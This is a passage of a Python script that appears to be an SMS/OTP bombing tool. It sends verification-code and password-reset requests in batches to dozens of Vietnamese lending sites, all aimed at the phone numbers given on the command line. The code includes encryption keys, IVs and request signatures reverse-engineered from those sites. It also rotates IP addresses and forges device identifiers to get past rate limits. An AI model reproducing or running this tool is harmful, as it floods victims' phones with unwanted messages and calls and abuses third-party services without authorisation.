                files={"q": (None, _spj_q(phone))},
                headers=hdrs,
            )
            try:
                d1 = r1.json()
            except Exception:
                d1 = {}
            voice_ok = d1.get("status") == 1 and d1.get("code") == 5335
            print(f"[SPJ-voice] code={d1.get('code')} msg={d1.get('message','')[:60]} ok={voice_ok}")

            # 2) SMS  forgotPassword tr token tht khi Suscess Okay
            r2 = await c.post(
                _SPJ_BASE + "/api/customer/forgotPassword",
                files={"q": (None, _spj_q(phone))},
                headers=hdrs,
            )
            try:
                d2 = r2.json()
            except Exception:
                d2 = {}
            sms_tok = d2.get("token") or d2.get("record")
            sms_ok  = d2.get("status") == 1 and bool(sms_tok)
            print(f"[SPJ-sms]   code={d2.get('code')} tok={bool(sms_tok)} msg={d2.get('message','')[:60]} ok={sms_ok}")

        ok = voice_ok or sms_ok
    except Exception as e:
        print(f"[SPJ] ERR {type(e).__name__}: {e}")
    return ok



#  AntamVay 
# Reverse-engineered from /js/index-BtXMnlZs.js
# Encrypt: AES-128-CBC key=2498eb0933a1e642 iv=e04df404fd559f27 PKCS7  base64
# gc(obj): AES-encrypt JSON string  base64, then base64-encode that base64 string (double-base64)
# quadrigeminal header: gc(publicParams JSON) where publicParams includes HMAC-SHA256 signature
# HMAC key: 3655a4d5f11048d50c56d7a3a3c2843f, sorted key-value pairs, exclude: taker/tsort/highway
_AV_FIELDS = {
    "appVersion": "fiendhead", "deviceName": "archpilferer", "deviceId": "kanchipuram",
    "osVersion": "gaydiang", "appMarket": "pinebrook", "sessionId": "voltairianize",
    "gpsAdid": "pratty", "language": "highway", "signature": "taker",
    "timestamp": "marduk", "path": "peelin", "nonce": "resolving",
    "phone": "orthogonalization", "type": "sesquipedalianism", "channel": "sublate",
}
_AV_AES_KEY  = b"2498eb0933a1e642"   # 16 bytes  AES-128
_AV_AES_IV   = b"e04df404fd559f27"   # 16 bytes
_AV_HMAC_KEY = b"3655a4d5f11048d50c56d7a3a3c2843f"
_AV_SKIP_SIG = {"taker", "tsort", "highway"}   # excluded from HMAC input


def _av_encrypt(plain: str) -> str:
    """AES-128-CBC PKCS7  base64 string."""
    cipher = AES.new(_AV_AES_KEY, AES.MODE_CBC, _AV_AES_IV)
    ct = cipher.encrypt(pad(plain.encode("utf-8"), 16))
    return base64.b64encode(ct).decode()


def _av_gc(obj) -> str:
    """gc(obj): encrypt JSON  double-base64 (matches JS gc function)."""
    aes_b64 = _av_encrypt(json.dumps(obj, separators=(",", ":")))
    return base64.b64encode(aes_b64.encode("utf-8")).decode()


def _av_signature(hdr_obj: dict) -> str:
    sig_str = "".join(
        f"{k}{v}"
        for k, v in sorted(hdr_obj.items())
        if k not in _AV_SKIP_SIG
    )
    return hmac.new(_AV_HMAC_KEY, sig_str.encode("utf-8"), hashlib.sha256).hexdigest()


async def Call_AntamVay(phone):
    F     = _AV_FIELDS
    did   = str(uuid.uuid4())
    ts    = str(int(time.time() * 1000))
    nonce = f"{ts}_{uuid.uuid4().hex[:13]}"
    path  = "/cellae/prorater"

    # Build public params (quadrigeminal header) with real HMAC signature
    hdr_obj = {
        F["appVersion"]: "1.0.0",
        F["deviceName"]: "iPhone",
        F["deviceId"]:   did,
        F["gpsAdid"]:    did,
        F["osVersion"]:  "18.1",
        F["appMarket"]:  "web-vnm-antamvay",
        F["sessionId"]:  "",
        F["language"]:   "vi",
        F["timestamp"]:  ts,
        F["path"]:       path,
        F["nonce"]:      nonce,
    }
    hdr_obj[F["signature"]] = _av_signature(hdr_obj)

    # Body: {phone, type:"1", channel:"sms"}
    body_obj = {F["phone"]: phone, F["type"]: "1", F["channel"]: "sms"}

    try:
        async with _make_client(timeout=15, ) as c:
            r = await c.post(
                "https://antam-vay.com/summarize/cellae/prorater",
                data={"boatloads": _av_gc(body_obj)},
                headers={
                    "Accept":            "application/json, text/plain, */*",
                    "Content-Type":      "application/x-www-form-urlencoded",
                    "X-Requested-With":  "XMLHttpRequest",
                    "User-Agent":        "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15",
                    "quadrigeminal":     _av_gc(hdr_obj),
                },
            )
        print(f"[AntamVay] {r.text[:200]}")
        try:
            resp = r.json()
        except Exception:
            resp = None
        if isinstance(resp, dict):
            code = str(resp.get("prorater", resp.get("code", "")))
            msg  = resp.get("nontransiency", "")
            return code in ("0", "00", "1008") or "Suscess Okay" in msg.lower()
        return r.status_code == 200
    except Exception as e:
        print(f"[AntamVay] ERR {type(e).__name__}: {e}")
        return False

# ── VayVuiLoan ───────────────────────────────────────────────────────────────
# Crypto reverse-engineered from https://h5.vayvuiloan.com/main.dart.js
# Mode : AES-192-CBC / PKCS7
# Key  : toLowerCase(base64(utf8("WJRnVfgiTZxs1dC8")))  →  24 bytes
# IV   : utf8("WJRnVfgiTZxs1dC8")                       →  16 bytes
# Sign : hardcoded constant found in dart2js bundle
_VVL_SEED = b"WJRnVfgiTZxs1dC8"
_VVL_KEY  = base64.b64encode(_VVL_SEED).decode().lower().encode()   # 24 bytes
_VVL_IV   = _VVL_SEED                                                # 16 bytes
_VVL_SIGN = "0f656af82eb1da33221a06d1171db265"
_VVL_PKG  = "com.vayvuiloan.vonnhanhh5ios"
_VVL_URL  = "https://vonapi.vayvuiloan.com/api/auth/identity/send-verification-code"
_VVL_HDRS = {
    "Content-Type":      "application/json",
    "deviceType":        "h5",
    "h":                 "2532",
    "Accept":            "*/*",
    "system":            "ios",
    "w":                 "1170",
    "channel":           "",
    "Sec-Fetch-Site":    "same-site",
    "XK8fRPQ3m6Tsv9JN": "5A2YLDWcez+p4K7B",
    "useragent":         "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
    "Sec-Fetch-Mode":    "cors",
    "platform":          "iPhone",
    "Origin":            "https://h5.vayvuiloan.com",
    "User-Agent":        "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
    "Referer":           "https://h5.vayvuiloan.com/",
    "vendor":            "Apple Computer, Inc.",
    "Sec-Fetch-Dest":    "empty",
    "Accept-Language":   "vi-VN,vi;q=0.9",
    "Accept-Encoding":   "identity",
    "Connection":        "keep-alive",
}

def _vvl_encrypt(obj: dict) -> str:
    raw = json.dumps(obj, separators=(",", ":"), ensure_ascii=False).encode()
    ct  = AES.new(_VVL_KEY, AES.MODE_CBC, _VVL_IV).encrypt(pad(raw, 16))
    return base64.b64encode(ct).decode()

async def vayvuiloan(phone: str) -> bool:
    dev_id  = hashlib.md5(uuid.uuid4().bytes).hexdigest()
    payload = {
        "appsFlyerId": None,
        "app_version": "1.0.0",
        "appversion":  "1.0.0",
        "version":     "1.0.0",
        "pkg_name":    _VVL_PKG,
        "timestamp":   str(int(time.time() * 1000)),
        "sign":        _VVL_SIGN,
        "imei":        dev_id,
        "uuid":        dev_id,
        "phone":       phone,
        "type":        "2",
    }
    try:
        async with _make_client(timeout=20) as client:
            r = await client.post(
                _VVL_URL,
                headers=_VVL_HDRS,
                json={"data": _vvl_encrypt(payload)},
            )
        ok = r.status_code == 200
        print(f"[VayVuiLoan] {r.status_code} ")
        return ok
    except Exception as e:
        print(f"[VayVuiLoan] ERR {type(e).__name__}: {e}")
        return False


# ── HappyDongPro ─────────────────────────────────────────────────────────────
# Reverse-engineered from https://h5.happydongpro.com/1.0.0/umi.c17ef75c.js
# Algorithm : AES-128-CBC / PKCS7  (body + response both encrypted)
# Key (16 B) : base64_decode("YWFqaWFvemljYXNobWVoNQ==") → b"aajiaozicashmeh5"
# IV  (16 B) : base64_decode("aGFqaWFvemljYXNobWVoNQ==") → b"hajiaozicashmeh5"
# x_x_path   : AES-CBC encrypt("/login/requestVerifyCode") → constant base64
# Real API   : POST /h5/<encrypted_path> ; server decrypts x_x_path to route
_HDPRO_KEY      = base64.b64decode("YWFqaWFvemljYXNobWVoNQ==")   # b"aajiaozicashmeh5"
_HDPRO_IV       = base64.b64decode("aGFqaWFvemljYXNobWVoNQ==")   # b"hajiaozicashmeh5"
_HDPRO_BASE     = "https://h5.happydongpro.com"
_HDPRO_URL      = f"{_HDPRO_BASE}/h5/xmks32xfc8svrvh68p564jhcyaoehqpq"
# x_x_path is deterministic (fixed IV+key+plaintext) — verified by decryption
_HDPRO_X_PATH   = "YCoyft17omVLyvU9+jEIkcL8RUweszQyIGJ8TDVcaw0="


def _hdpro_enc(obj) -> str:
    raw = json.dumps(obj, separators=(",", ":"), ensure_ascii=False).encode()
    ct  = AES.new(_HDPRO_KEY, AES.MODE_CBC, _HDPRO_IV).encrypt(pad(raw, 16))
    return base64.b64encode(ct).decode()


def _hdpro_dec(b64: str) -> dict:
    try:
        ct    = base64.b64decode(b64)
        plain = unpad(AES.new(_HDPRO_KEY, AES.MODE_CBC, _HDPRO_IV).decrypt(ct), 16)
        return json.loads(plain.decode().strip())
    except Exception:
        return {}


async def Call_HappyDongPro(phone: str) -> bool:
    # Phone format: 84XXXXXXXXX (strip leading 0, prepend 84)
    ph84 = "84" + phone.lstrip("0") if phone.startswith("0") else phone
    body = _hdpro_enc({"phone": ph84, "isVoice": False, "h5": False, "deviceId": ""})
    hdrs = {
        "fpPlatform":     "5",
        "appId":          "35",
        "language":       "vi-VN",
        "User-Agent":     "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
        "Referer":        f"{_HDPRO_BASE}/login",
        "country":        "undefined",
        "Origin":         _HDPRO_BASE,
        "Sec-Fetch-Dest": "empty",
        "fpDeviceId":     "",
        "version":        "1.0.0_4.1.9",
        "Sec-Fetch-Site": "same-origin",
        "fingerPrint":    "",
        "Content-Type":   "application/json",
        "deviceId":       "",
        "platform":       "2",
        "token":          "undefined",
        "x_x_path":       _HDPRO_X_PATH,
        "loginPlatform":  "H5",
        "marketToken":    "undefined",
        "Accept":         "application/json",
        "Sec-Fetch-Mode": "cors",
        "Accept-Language": "vi-VN,vi;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
    }
    try:
        async with _make_client(timeout=20) as client:
            r = await client.post(_HDPRO_URL, headers=hdrs, content=body.encode())
        d = _hdpro_dec(r.text.strip()) if r.status_code == 200 else {}
        ok = bool(d.get("successful")) or str(d.get("code", "")) in ("0", "200")
        msg = d.get("msg") or d.get("message") or r.text[:80]
        print(f"  [HappyDongPro] {'✓' if ok else '✗'} {phone}  {msg}")
        return ok
    except Exception as e:
        print(f"[HappyDongPro] ERR {type(e).__name__}: {e}")
        return False


# ── VietCalo ─────────────────────────────────────────────────────────────────
# Same platform as HappyDongPro — identical key/IV/x_x_path confirmed by sniff
# Differences: host, obfuscated URL path, appId=39, UA "vietcalo", loginPlatform=APP
# Body has no deviceId field; real_path header exposed in plain text
_VIETCALO_BASE   = "https://h5.vietcalo.com"
_VIETCALO_URL    = f"{_VIETCALO_BASE}/h5/kr6oyah641pmtseqvfk88ffcp5xfunkb"


async def Call_VietCalo(phone: str) -> bool:
    ph84 = "84" + phone.lstrip("0") if phone.startswith("0") else phone
    body = _hdpro_enc({"phone": ph84, "isVoice": False, "h5": False})
    hdrs = {
        "appId":          "39",
        "language":       "vi-VN",
        "User-Agent":     "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) vietcalo",
        "fpPlatform":     "2",
        "country":        "undefined",
        "Referer":        f"{_VIETCALO_BASE}/login",
        "Origin":         _VIETCALO_BASE,
        "real_path":      "/login/requestVerifyCode",
        "fpDeviceId":     "",
        "version":        "1.0.3_1.1.1",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Site": "same-origin",
        "fingerPrint":    "",
        "deviceId":       "",
        "platform":       "2",
        "token":          "",
        "x_x_path":       _HDPRO_X_PATH,
        "loginPlatform":  "APP",
        "marketToken":    "",
        "Accept":         "application/json",
        "Content-Type":   "application/json",
        "Accept-Language": "vi-VN,vi;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Sec-Fetch-Mode": "cors",
    }
    try:
        async with _make_client(timeout=20) as client:
            r = await client.post(_VIETCALO_URL, headers=hdrs, content=body.encode())
        d   = _hdpro_dec(r.text.strip()) if r.status_code == 200 else {}
        ok  = bool(d.get("successful")) or str(d.get("code", "")) in ("0", "200")
        msg = d.get("msg") or d.get("message") or r.text[:80]
        print(f"  [VietCalo] {'✓' if ok else '✗'} {phone}  {msg}")
        return ok
    except Exception as e:
        print(f"[VietCalo] ERR {type(e).__name__}: {e}")
        return False


async def Call_Zinnexi(phone: str) -> bool:
    mobile    = phone if phone.startswith("0") else "0" + phone.lstrip("0")
    device_id = f"jrgox{int(time.time() * 1000)}"
    hdrs = {
        "Accept":          "application/json, text/plain, */*",
        "Content-Type":    "application/json",
        "X-Channel":       "organic",
        "Accept-Language": "vn",
        "User-Agent":      _rand_ua(),
        "Connection":      "keep-alive",
    }
    body = {"mobile": mobile, "channel": "organic", "deviceId": device_id}
    try:
        async with httpx.AsyncClient(timeout=15, verify=False) as c:
            r = await c.post("https://m.zinnexi.com/api-v2/pub/user/otp", json=body, headers=hdrs)
        print(f"[Zinnexi] {r.status_code} ")
        return r.status_code == 200 and "OPERATE_OK" in r.text
    except Exception as e:
        print(f"[Zinnexi] ERR {type(e).__name__}: {e}")
        return False

async def main():
    phones = sys.argv[1:21]
    if not phones:
        print("Usage: python oki.py <phone1> [phone2] ...")
        sys.exit(1)

    print("[ChangeIP] Xoay IP Xoay...")
    await _doi_ip()
    all_funcs = [
        (Call_ViHeo,),
        (vayvuiloan,),
        (Call_Calcvay,),
        (sentSms_DuoVay,),
#        (Call_TP_SMS,),
        (call1,),
        (random_sao,),
#        (Call_TienPhong_SMS,),
        (Call_Blue_SMS,),
        (Call_AntamVay,),
        (Call_TuiTien,),
        (Call_Zinnexi,),
        (giaothong365_register,),
        (Call_Vay24h,),
        (call8,),
        (Call_Lavi_SMS,),
        (Call_HTC_SMS,),
        (vaysuoi,),
        (Vay_Nhanh_SMS,),
        (Call_PTV_SMS,),
        (FB_Finance_SMS,),
        (Call_Vay24h,),
        (Call_Petro_SMS,),
        (Call_AChau_SMS,),
        (anvay,),
        (Call_SenVay,),
        (Call_MarVay_New,),
        (Call_VayDay,),    
        (Call_ITake,),
        (Call_QQ_SMS,),
        (seabankasset,),
        (vaygo,),
        (giaothong365_forgot,),
        (Call_Wan_SMS,),
        (Call_VayFast,),
        (hicash,),
        (lotte,),
        (vnadmin_2,),
        (Call_VayDep365,),
        (Call_HappyDongPro,),
        (Call_VietCalo,),
        (sentSms_FvBanana,),
        (sentSms1,),
        (vayxanh,),
        (vnadmin_1,),
        (Call_F668,),
        (vnadmin_3,),
        (Call_LuckyLoan,),
        (Call_KetVang,),
        (Call_SPJ,),
    ]

    async def safe_call(func, phone):
        try:
            return await asyncio.wait_for(func(phone), timeout=25)
        except Exception as e:
            print(f"[{func.__name__}] Lỗi {type(e).__name__}: {e}")
            return False

    max_cycles = 1
    cycle = 0

    while cycle < max_cycles:
        cycle += 1

        print(
            f"\n{'='*60}\n"
            f"🚀 VÒNG {cycle}/{max_cycles}\n"
            f"📌 Bắt đầu thực thi {len(all_funcs)} hàm\n"
            f"{'='*60}"
        )

        for func, *_ in all_funcs:
            results = await asyncio.gather(
                *[safe_call(func, phone) for phone in phones]
            )

            if any(results):
                print(f"[{func.__name__}] ✅ Thành công, chờ 6–10 giây")
                await asyncio.sleep(random.randint(6, 10))

        print(f"[VÒNG {cycle}/{max_cycles}] ✅ Hoàn thành.")

    print(f"\n🎉 Đã chạy xong {max_cycles} vòng, dừng chương trình.")

if __name__ == "__main__":
    asyncio.run(main())